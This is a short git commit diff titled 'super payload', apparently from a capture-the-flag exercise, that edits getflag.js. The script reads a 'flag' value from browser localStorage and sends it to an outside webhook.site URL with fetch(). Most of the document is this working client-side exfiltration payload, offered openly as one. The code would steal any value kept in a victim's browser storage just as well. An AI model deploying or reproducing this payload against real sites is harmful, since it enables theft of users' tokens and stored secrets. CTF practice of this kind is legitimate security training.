d00b5a45bd9e91b04396f770c7a89021ee2cef90
Clément <kyloren3600@gmail.com>
2025-04-05 02:02:11 +0200

    super payload

--- getflag.js
+++ getflag.js
@@ -1,4 +1,4 @@
 console.log("coucou")
 webhook_url = "https://webhook.site/98ee5556-aed4-45da-aac9-f971e45ab05c/?flag="
-fetch(`${webhook_url}${localStorage.getItem("flag")}`)
+fetch(`${webhook_url}${window.localStorage.getItem("flag")}`)
 
